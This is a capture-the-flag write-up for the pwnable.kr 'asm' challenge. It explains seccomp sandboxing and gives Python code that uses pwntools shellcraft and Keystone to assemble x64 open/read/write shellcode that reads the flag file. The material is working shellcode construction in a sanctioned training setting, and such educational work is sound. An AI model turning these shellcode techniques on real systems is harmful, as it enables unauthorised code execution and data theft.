# Asm
In this challenge we need to work with some shellcode.
In particular we have to send `open()`, `read()` and `write()` functions to `pwnable.kr` on port 9026.
```
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: 
```
SECCOMP stands for secure computing mode. It's a simple sandboxing tool in the Linux kernel, available since Linux version 2.6.12. When enabling seccomp, the process enters a "secure mode" where a very small number of system calls are available (exit(), read(), write(), sigreturn()) (if you want to learn more about SECCOMP sanbox click [here](https://wiki.mozilla.org/Security/Sandbox/Seccomp)).
## Solution
I searched on the internet and found a pwntools module called **shellcraft**, it allow us to generate assembly code in a very easy way.
Reading its documentation I found a way to generate the assembly code of `open()`, `read()` and `write`.
```
# Shellcode for the open() function
open_shell_code = shellcraft.amd64.open('./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0).replace("SYS_open", "2")

# Shellcode for the read() function
read_shell_code = shellcraft.amd64.read('rax', 'rsp', 30)

# Shellcode for the write() function
write_shell_code = shellcraft.amd64.write(1, 'rsp', 30).replace("SYS_write", "1")
```

I replaced SYS_open and SYS_write with 2 and 1 respectively because they were throwing errors with the keystone module.

[Keystone](https://www.keystone-engine.org/) is a lightweight multi-platform, multi-architecture assembler framework. It offers some unparalleled features:
* Multi-architecture, with support for Arm, Arm64 (AArch64/Armv8), Ethereum Virtual Machine, Hexagon, Mips, PowerPC, Sparc, SystemZ & X86 (include 16/32/64bit).
* Clean/simple/lightweight/intuitive architecture-neutral API.
* mplemented in C/C++ languages, with bindings for Java, Masm, C#, PowerShell, Perl, Python, NodeJS, Ruby, Go, Rust, Haskell, VB6 & OCaml available.
* Native support for Windows & *nix (with Mac OSX, Linux, *BSD & Solaris confirmed).
* Thread-safe by design.
* Open source - with a dual license

I used keystone to convert the assembly code into a byte array:
```
assembly = open_shell_code + read_shell_code + write_shell_code

try:
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoded_instructions, _num_of_instruction = ks.asm(assembly)
except KsError as e:
    print(f"[-] {e}")
    print("[-] Bye")
    quit(1)

shellcode = b""
for i in encoded_instructions:
    shellcode += i.to_bytes(length=1, byteorder='little')
```
Running this script we will be able to read the flag.